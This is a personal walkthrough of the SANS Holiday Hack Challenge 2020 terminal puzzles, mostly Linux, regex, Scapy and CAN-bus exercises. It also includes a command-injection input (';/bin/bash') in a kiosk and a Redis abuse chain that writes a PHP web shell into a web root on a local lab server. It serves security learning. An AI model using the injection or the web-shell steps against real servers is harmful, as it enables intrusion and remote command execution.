# CHALLENGE 1 - Linux Primer #

## PROCEDURE : ##

>1.	Perform a directory listing of your home directory to find a munchkin and retrieve a lollipop!
```
$ ls
```

>2.	Now find the munchkin inside the munchkin.
```
$ cat munchkin_19315479765589239
```

>3.	Great, now remove the munchkin in your home directory.
```
$ rm munchkin_19315479765589239
```

>4.	Print the present working directory using a command.
```
$ pwd
```

>5.	Good job but it looks like another munchkin hid itself in you home directory. Find the hidden munchkin!
```
$ ls –a
```

>6.	Excellent, now find the munchkin in your command history.
```
$ history
```

>7.	Find the munchkin in your environment variables.
```
$ env
```

>8.	Next, head into the workshop.
```
$ cd workshop/
```

>9.	A munchkin is hiding in one of the workshop toolboxes. Use "grep" while ignoring case to find which toolbox the munchkin is in.
```
$ cat toolbox_* | grep -i munchkin
```

>10.	A munchkin is blocking the lollipop_engine from starting. Run the lollipop_engine binary to retrieve this munchkin.
```
$ chmod 755 lollipop_engine
$ ./lollipop_engine
```

>11.	Munchkins have blown the fuses in /home/elf/workshop/electrical. cd into electrical and rename blown_fuse0 to fuse0.
```
$ cd /home/elf/workshop/electrical/
$ cp blown_fuse0 fuse0
$ rm blown_fuse0
```

>12.	Now, make a symbolic link (symlink) named fuse1 that points to fuse0
```
$ ln -s fuse0 fuse1
```

>13.	Make a copy of fuse1 named fuse2.
```
$ cp fuse1 fuse2
```

>14.	We need to make sure munchkins don't come back. Add the characters "MUNCHKIN_REPELLENT" into the file fuse2.
```
$ echo MUNCHKIN_REPELLENT >> fuse2
```

>15.	Find the munchkin somewhere in /opt/munchkin_den.
```
$ cd /opt/munchkin_den/
$ find -iname *munchkin*
```

>16.	Find the file somewhere in /opt/munchkin_den that is owned by the user munchkin.
```
$ find /opt/munchkin_den/ -user munchkin
```

>17.	Find the file created by munchkins that is greater than 108 kilobytes and less than 110 kilobytes located somewhere in /opt/munchkin_den.
```
$ find /opt/munchkin_den/ -size +108k -size -110k
```

>18.	List running processes to find another munchkin.
```
$ ps –e
```

>19.	The 14516_munchkin process is listening on a tcp port. Use a command to have the only listening port display to the screen.
```
$ netstat –napt
```

>20.	The service listening on port 54321 is an HTTP server. Interact with this server to retrieve the last munchkin.
```
$ curl 0.0.0.0:54321
```

>21.	Your final task is to stop the 14516_munchkin process to collect the remaining lollipops.
```
$ kill 28786
```

>22.	Congratulations, you caught all the munchkins and retrieved all the lollipops!
>	Type "exit" to close...
```
$ exit
```



#  
#  
#  

# CHALLENGE 2 - Unescape Tmux #

## HINTS: ##
<details>
  <summary>Hints provided for Challenge 2</summary>
  
>-	**PEPPER MINSTIX:** There's a handy tmux reference available at [https://tmuxcheatsheet.com/](https://tmuxcheatsheet.com/)!

</details>

  
## PROCEDURE : ##

Have a look at [https://tmuxcheatsheet.com/](https://tmuxcheatsheet.com/) and in the terminal enter the following command:

```
$ tmux attach-session
```


#  
#  
#  

# CHALLENGE 3 - Kringle Kiosk #

## HINTS: ##
<details>
  <summary>Hints provided for Challenge 3</summary>
  
>-	**SHINNY UPATREE:** There's probably some kind of [command injection](https://owasp.org/www-community/attacks/Command_Injection) vulnerability in the menu terminal.
</details>

  
## PROCEDURE : ##
The hint pretty much points us in the right direction immediatley and the link within it explicity explains what needs to be done.

When prompted I selected menu item **4. Print Name Badge** which accepts free text input and kindly asks you to avoid special characters as *“they cause some weird errors”*.  I disobeyed this and entered ``;/bin/bash`` and that got me to a bash prompt.

![image](https://github.com/beta-j/SANS-Holiday-Hack-Challenge-2020/assets/60655500/16373a6a-11bd-415e-8dd3-60f3e9006525)

#  
#  
#  

# CHALLENGE 4 - 33.6Kbps #


## PROCEDURE : ##
Dial `7568347` followed by the following sounds (in order):
-	Baa DEE brrr
-	Aaah
-	WEWEWwrwrrwrr
-	beDURRdunditty
-	SCHHRRHHRTHRTR

![image](https://github.com/beta-j/SANS-Holiday-Hack-Challenge-2020/assets/60655500/02882da2-8533-46db-bb7b-5352ff4acd99)

#  
#  
#  

# CHALLENGE 5 - Regex Game #

## HINTS: ##
<details>
  <summary>Hints provided for Challenge 5</summary>
  
>-	**MINTY CANDYCANE:** Here's a place to try out your JS Regex expressions: [https://regex101.com/](https://regex101.com/)
>-	**MINTY CANDYCANE:** Handy quick reference for JS regular expression construction: [https://www.debuggex.com/cheatsheet/regex/javascript](https://www.debuggex.com/cheatsheet/regex/javascript)

</details>

  
## PROCEDURE : ##
>1.	Matches at least one digit:
```
\d
```

>2.	Matches 3 alpha a-z cahracters ignoring case:
```
[a-zA-Z]{3}
```

>3.	Matches 2 chars of lowercase a-z or numbers:
```
[a-z0-9]{2}
```

>4.	Matches any 2 chars not uppercase A-L or 1-5
```
[^A-L1-5]{2}
```

>5.	Matches three or more digits only
```
^[0-9]{3,}$
```

>6.	Matches multiple hour:minute:second formats only
```
^(2[0-3]|[01]?[0-9]):([0-5][0-9]):([0-5]?[0-9])$
```

>7.	Matches MAC address format only while ignoring case
```
^([0-9a-fA-F][0-9a-fA-F]:){5}([0-9a-fA-F][0-9a-fA-F])$
```

>8.	Matches multiple day,month, and year date formats only
```
^(0[1-9]|[12][0-9]|3[01])[- /.](0[1-9]|1[012])[- /.](19|20)\d\d$
```

![image](https://github.com/beta-j/SANS-Holiday-Hack-Challenge-2020/assets/60655500/29f40143-dfe3-465c-ae8d-bc0098d77c52)

#  
#  
#  

# CHALLENGE 6 - Speaker Door Open #

## HINTS: ##
<details>
  <summary>Hints provided for Challenge 6</summary>
  
>-	**BUSHY EVERGREEN:**  The `strings` command is common in Linux and available in Windows as part of `SysInternals`.

</details>

  
## PROCEDURE : ##
Run `strings door` – this returns clear text from within the binary file

I notice this part:

![image](https://github.com/beta-j/SANS-Holiday-Hack-Challenge-2020/assets/60655500/4853e821-d886-4af4-90be-743438d225d8)

Well that’s a convenient reminder ``And don’t forget, the password is`` **``“Op3nTheD00r”``**
![image](https://github.com/beta-j/SANS-Holiday-Hack-Challenge-2020/assets/60655500/a32c3ab0-1814-46bb-89e0-7abfa43acd4e)

#  
#  
#  

# CHALLENGE 7 - Speaker Lights On #

## HINTS: ##
<details>
  <summary>Hints provided for Challenge 7</summary>
  
>-	**BUSHY EVERGREEN:**  While you have to use the lights program in `/home/elf/` to turn the lights on, you can delete parts in `/home/elf/lab/`.

</details>

  
## PROCEDURE : ##
Bushy Evergreen hints us immediately in the right direction – what if we were to replace the username in the `lights.conf` file with an encrypted value?  So I edited `lab/lights.conf` and replaced the username with the encypted password string.  When I ran `./lights` in `lab/` it conveniently unencrypted the string in the username for me 😄
![image](https://github.com/beta-j/SANS-Holiday-Hack-Challenge-2020/assets/60655500/49b722d5-2f68-47fc-9a0b-b6776ab0a07d)

Then I just passed on the same password to `/home/elf/lights`.

#  
#  
#  

# CHALLENGE 8 - Vending Machine #

## HINTS: ##
<details>
  <summary>Hints provided for Challenge 8</summary>
  
>-	**BUSHY EVERGREEN:**  For polyalphabetic ciphers, if you have control over inputs and visibilty of outputs, lookup tables can save the day.

</details>

  
## PROCEDURE : ##
I decided to follow Bushy Evergreen’s hint to the letter and deleted the `lab/vending_machine.json` file, ran `./vending_machine` and entered `AAAAAAAAAAA` and `BBBBBBBBBB` as username and password.

Looking at the resulting `vending_machine.json` file and knowing (from the hints) that this was a polyalphabetic cipher, I could immediately tell that the password was being encoded with a 8-character repeating key.

Varying the username whilst keeping the same password had no effect on the encoded output, so the key being used must be a static one.

So I created [an Excel sheet](assets/vending%20machine%20challenge.xlsx) and plotted out the results for each combination of `AAAAAAAAA`, `BBBBBBBB`, `CCCCCC`, etc...  including lowercase letters and numbers.  I knew that the enciphered password is **`LVEdQPpBwr`** – so if any of the abve combinations gave me a corresponding letter in the correct position as the enciphered text (eg. `E` in the 3rd position or `r` in the 10th position), then I could tell that the repeating letter used as my input is the corresponding letter of the cleartext password.

![image](https://github.com/beta-j/SANS-Holiday-Hack-Challenge-2020/assets/60655500/bfe4b5c9-8812-41f8-bc3e-aca311cd78d8)

As per Bushy’s advice I set up a lookup table in excel to match corresponding entries and show the correct password characters:
```
=INDEX($A$2:$A$63,MATCH(TRUE,EXACT(S2,B2:B63),0))
```
I ran the `vending_machine` program over and over again using the most commonly used characters first and after a while I had my deciphered password: **`CandyCane1`**.

I’m not particularly proud of how I solved this one, but hey – it did the trick.

#  
#  
#  

# CHALLENGE 9 - Elf Coder #

## HINTS: ##
<details>
  <summary>Hints provided for Challenge 9</summary>
  
>-	**RIBB BONBOWFORD:** Did you try the JavaScript primer? There's a great section on looping.
>-	**RIBB BONBOWFORD:** Want to learn a useful language? [JavaScript](https://jgthms.com/javascript-in-14-minutes/) is a great place to start! You can also test out your code using a [JavaScript playground](https://playcode.io/).
>-	**RIBB BONBOWFORD:** There are lots of ways to [make your code shorter](https://jscompress.com/), but the number of elf commands is key.
>-	**RIBB BONBOWFORD:** [There's got to be a way to filter for specific typeof items in an array](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/TypedArray/filter). Maybe [the typeof operator](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/typeof) could also be useful?
>-	**RIBB BONBOWFORD:** [In JavaScript you can enumerate an object's keys using keys, and filter the array using filter](https://stackoverflow.com/questions/9907419/how-to-get-a-key-in-a-javascript-object-by-its-value).
>-	**RIBB BONBOWFORD:** ``var array = [2, 3, 4]; array.push(1)`` doesn't do QUITE what was intended...


</details>

  
## PROCEDURE : ##

### Level 1: ###
```
elf.moveLeft(10)
elf.moveUp(11)
```

### Level2: ###
```
elf.moveLeft(6)
var ans=elf.get_lever(0)+2
elf.pull_lever(ans)
elf.moveLeft(4)
elf.moveUp(11)
```

### Level 3: ###
```
elf.moveTo(lollipop[0])
elf.moveTo(lollipop[1])
elf.moveTo(lollipop[2])
elf.moveUp(1)
```

### Level 4: ###
```
var x=0
for (x=0; x<4; x++){
  elf.moveLeft(3)
  elf.moveDown(40)
  elf.moveLeft(3)
  elf.moveUp(40)  
}
```

### Level 5: ###
```
elf.moveTo(lollipop[1])
elf.moveTo(lollipop[0])
var ans = elf.ask_munch(0)  //ask munchkin for array
var filtered = ans.filter(Number) //filter out non-numeric elements
elf.tell_munch(filtered)  //give munchkin the filtered array
elf.moveUp(2)
```

### Level 6: ###
```
var x = 0
for (x = 0; x < 4; x++) {  //this part navigates from one lollipop to the next
  elf.moveTo(lollipop[x])
}
elf.moveTo(lever[0])  // walk to the lever
var leverlist = elf.get_lever(0)  // get the array from the lever
leverlist.unshift("munchkins rule") // prepend it with the string
elf.pull_lever(leverlist)  // return the modified array
elf.moveDown(3)  // walk to the exit
elf.moveLeft(6)
elf.moveUp(2)
```

### Level 7: ###
Yeah.,..this is about as far as my coding skills can get me :/
```
for (x = 1; x < 9; x += 4) {
  elf.moveDown(x)
  lever(x - 1)
  elf.moveLeft(x + 1)
  lever(x)
  elf.moveUp(x + 2)
  lever(x + 1)
  elf.moveRight(x + 3)
  lever(x + 2)
}
elf.moveUp(2)
elf.moveLeft(4)
elf.tell_munch(cleansum)
function lever(num) {
  elf.pull_lever(num)
}
function cleansum(arg) {
  var filtered = arg.filter(Number)
  for (var i = 0; i < filtered.length; i++) {
    total += filtered[i]
  }
  return total
}
```

#  
#  
#  

# CHALLENGE 10 - Scapy Prepper #

## PROCEDURE : ##
```
>>> task.submit(‘start’)
```
![image](https://github.com/beta-j/SANS-Holiday-Hack-Challenge-2020/assets/60655500/3472b17a-28aa-4aa4-b3bf-9b8a4ad48080)

```
>>> task.submit(send)
```
![image](https://github.com/beta-j/SANS-Holiday-Hack-Challenge-2020/assets/60655500/eb2e1f5a-b415-470f-9a48-d2750416c81e)

```
>>> task.submit(sniff)
```
![image](https://github.com/beta-j/SANS-Holiday-Hack-Challenge-2020/assets/60655500/b247f751-5918-4c16-b2b5-3474610ecdd0)

```
>>> task.submit(1)
```
![image](https://github.com/beta-j/SANS-Holiday-Hack-Challenge-2020/assets/60655500/69246802-c521-4b1e-8df1-101e08f95103)

```
>>> task.submit(rdpcap)
```
![image](https://github.com/beta-j/SANS-Holiday-Hack-Challenge-2020/assets/60655500/e80faf00-4717-4ae8-a743-d433d20ab04b)

```
>>> task.submit(2)
```
![image](https://github.com/beta-j/SANS-Holiday-Hack-Challenge-2020/assets/60655500/27214a0d-71a5-4aa9-a154-7383c3479dc4)

```
>>> task.submit(UDP_PACKETS[0])
```
![image](https://github.com/beta-j/SANS-Holiday-Hack-Challenge-2020/assets/60655500/bee60799-a9c9-45e9-98fe-3523f23e05f2)

```
>>> task.submit(TCP_PACKETS[1][TCP])
```
![image](https://github.com/beta-j/SANS-Holiday-Hack-Challenge-2020/assets/60655500/72c12472-981d-49a6-8b4e-db01b9f53414)

```
>>> UDP_PACKETS[0][IP].src = “127.0.0.1”
>>> task.submit(UDP_PACKETS[0])
```
![image](https://github.com/beta-j/SANS-Holiday-Hack-Challenge-2020/assets/60655500/192e0d9c-038e-461e-99f6-3e7816c0f86d)
 
By running ``>>> TCP_PACKETS.show()`` we find which packets in the list have a raw payload:

![image](https://github.com/beta-j/SANS-Holiday-Hack-Challenge-2020/assets/60655500/6c7e2e5c-1fda-4455-a23b-6ea85e5de45b)
![image](https://github.com/beta-j/SANS-Holiday-Hack-Challenge-2020/assets/60655500/a0031c04-f644-415d-8f17-02514b299dd7)

```
>>> task.submit(‘PASS echo’)
```
![image](https://github.com/beta-j/SANS-Holiday-Hack-Challenge-2020/assets/60655500/8789bc14-aadb-4b37-9a3b-6048258e6a2f)

```
>>> task.submit(ICMP_PACKETS[1][ICMP].chksum)
```
![image](https://github.com/beta-j/SANS-Holiday-Hack-Challenge-2020/assets/60655500/c04fd2ab-3a07-41ef-b3a6-65aa72b1849f)

``` 
>>> task.submit(3)
```
![image](https://github.com/beta-j/SANS-Holiday-Hack-Challenge-2020/assets/60655500/7bbb11e0-af93-4215-9332-2c2f7d36b32f)

``` 
>>> pkt = Ether()/IP(dst=”127.127.127.127”)/UDP(dport=5000)
>>> task.submit(pkt)
```
![image](https://github.com/beta-j/SANS-Holiday-Hack-Challenge-2020/assets/60655500/9fe50c4d-0ed6-4054-b5af-d16f40cd5168)

``` 
>>> dns_query = IP(dst=”127.2.3.4”)/UDP(dport=53)/DNS(qd=DNSQR(qname=”elveslove.santa”))
>>> task.submit(dns_query)
```
![image](https://github.com/beta-j/SANS-Holiday-Hack-Challenge-2020/assets/60655500/4bbe74bb-762b-4417-a4cc-d492abe0bf2f)

 
If we look at and compare `ARP_PACKETS[0][ARP]` and `ARP_PACKETS[1][ARP]` we can see that the ARP reply has incorrect `op`, `hwsrc` and `hwdst` values.

`op` should be `2` since it is an ARP reply so:
```
>>> ARP_PACKETS[1][ARP].op=2
```


`hwdst` should be the MAC of the machine that made the ARP request so:
```
>>> ARP_PACKETS[1][ARP].hwdst=”00:16:ce:6e:8b:24”
```

`hwsrc` should be the MAC address for `192.168.0.1`.  If we run `ARP_PACKETS[1]` we can see the Ethernet encapsulation of the ARP response which includes the MAC address.  So:
```
>>> ARP_PACKETS[1][ARP].hwsrc=”00:13:46:0b:22:ba”
>>> task.submit(ARP_PACKETS)
```
![image](https://github.com/beta-j/SANS-Holiday-Hack-Challenge-2020/assets/60655500/190b793a-40f3-459a-b4fb-644d86195e86)

#  
#  
#  

# CHALLENGE 11 - CAN-Bus Investigation #

## HINTS: ##
<details>
  <summary>Hints provided for Challenge 11</summary>
  
>-	**WUNROSE OPENSLAE:** You can hide lines you don't want to see with commands like ``cat file.txt | grep -v badstuff``
>-	**WUNROSE OPENSLAE:** Chris Elgee is talking about how [CAN traffic](https://www.youtube.com/watch?v=96u-uHRBI0I) works right now!


</details>

  
## PROCEDURE : ##
`candump.log` contains a lot of entries that are meaningless to us.  The most common ones start with `244` or `188` – so let’s `grep` these out of the way:
```
~$ cat candump.log | grep -v 244# | grep -v 188#
```
![image](https://github.com/beta-j/SANS-Holiday-Hack-Challenge-2020/assets/60655500/ec2ac0b1-eb86-4fd0-b027-b83993c11cd8)

We are left with three entries and we know there was a **LOCK**, **UNLOCK** and **LOCK** event sequence, so we can assume that the second entry must correspond to the **UNLOCK signal**... so:

```
~$ ./runtoanswer
> 122520
```
![image](https://github.com/beta-j/SANS-Holiday-Hack-Challenge-2020/assets/60655500/ee6d1eb8-5099-47d7-977a-1d3acc670f7b)

#  
#  
#  

# CHALLENGE 12 - Redis Bug #

## HINTS: ##
<details>
  <summary>Hints provided for Challenge 12</summary>
  
>-	**HOLLY EVERGREEN:** [This](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis) is kind of what we're trying to do...


</details>

  
## PROCEDURE : ##
Running ``~$ curl http://localhost/maintenance.php`` shows us that multiple arguments need to be separated by commas instead of spaces in the `curl` command…this is a very useful tip for what we need to do next.

``~$ curl http://localhost/maintenance.php?cmd=info`` shows us that we can run `redis-cli` commands without authorisation.  It also tells us that there is one database with index `0`
```
~$ curl http://localhost/maintenance.php?cmd=SELECT,0
~$ curl http://localhost/maintenance.php?cmd=KEYS,*
~$ curl http://localhost/maintenance.php?cmd=GET,dir
```
And we see `/var/www/html` this must be the path to the website folder.

Now we can pretty much follow the steps in [the link](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis)  provided in Holly Evergreen’s Hint.

We move to the webserver directory:
```
curl http://localhost/maintenance.php?cmd=config,set,dir,/var/www/html/
```

Create a file named `hackme.php`
```
curl http://localhost/maintenance.php?cmd=config,set,dbfilename,hackme.php
```

Then place a malicious bit of php code in that file which will allow us to pass on any command;
```
"<?php echo shell_exec($_GET['cmd']);?>"
```
**Note:** the php script was formatted using the **URL encode** module on [CyberChef](https://gchq.github.io/CyberChef/):
```
curl http://localhost/maintenance.php?cmd=set%2Ctest%2C%22%3C%3Fphp%20echo%20shell%5Fexec%28%24%5FGET%5B%27cmd%27%5D%29%3B%3F%3E%22
```

And save
```
curl http://localhost/maintenance.php?cmd=save
```

Finally we can request the contents of `index.php` by passing a `cat` command as the following curl:
```
curl http://localhost/hackme.php?cmd=cat%20index.php --output -
```
And sure enough there is a bug in `index.php` !

![image](https://github.com/beta-j/SANS-Holiday-Hack-Challenge-2020/assets/60655500/263bcb66-9f01-463b-a79d-bcc413b9d6c0)

# CHALLENGE 13 - Snowball Fight #

## HINTS: ##
<details>
  <summary>Hints provided for Challenge 13</summary>
  
>-	**TANGLE COALBOX:** Tom Liston is giving two talks at once - amazing! One is about the [Mersenne Twister](https://www.youtube.com/watch?v=Jo5Nlbqd-Vg).
>-	**TANGLE COALBOX:** Need extra Snowball Game instances? Pop them up in a new tab from [https://snowball2.kringlecastle.com.](https://snowball2.kringlecastle.com/)
>-	**TANGLE COALBOX:** While system time is probably most common, developers have the option to [seed](https://docs.python.org/3/library/random.html) pseudo-random number generators with other values.
>-	**TANGLE COALBOX:** Python uses the venerable Mersenne Twister algorithm to generate PRNG values after seed. Given enough data, an attacker might [predict](https://github.com/kmyk/mersenne-twister-predictor/blob/master/readme.md) upcoming values.

</details>

  
## PROCEDURE : ##
I noticed that starting two ‘Easy’ games with the same username will hide the computer’s forts in the exact same places – so somehow the username is being used as a seed to determine the location of the computer’s forts.  As a test I passed the username generated by a ‘hard’ level game to an ‘easy’ level game and once I won the ‘easy’ game I was able to predict the location of all the forts in the ‘hard’ game.

Next, I selected the impossible difficulty level and inspected the page source.  Immediately I notice a list of integer values with a comment next to each one saying *“Not random enough”*.  Copying the list into Excel I can tell that there are exactly 624 entries.  This number rings a bell as the [Mersenne Twister Predictor suggested in the hints](https://github.com/kmyk/mersenne-twister-predictor/blob/master/readme.md) requires  624 32-bit integers for it to predict the next 376 numbers.

So if I can feed the 624 rejected entries to the Mersenne Twister Predictor and use it to generate the next PRNG output integer, I will be able to pass that as a username to an ‘easy’ game, complete the game and accurately predict the location of the forts in the ‘impossible’ level.

So I created a file called `data.txt` containing all of the rejected usernames, then:
```
~ cat data.txt | mt19937predict > predict.txt
~ head –n 1 predict.txt
```
![image](https://github.com/beta-j/SANS-Holiday-Hack-Challenge-2020/assets/60655500/18755ec1-c9a1-43a8-8120-425d13fba0b0)

This gave me the next valid PRNG generated integer: `2071393616`

I used this as a username in an Easy game, won the game and recorded where all the hits where, then I played the exact same coordinates in the ‘impossible’ game to win it 😃
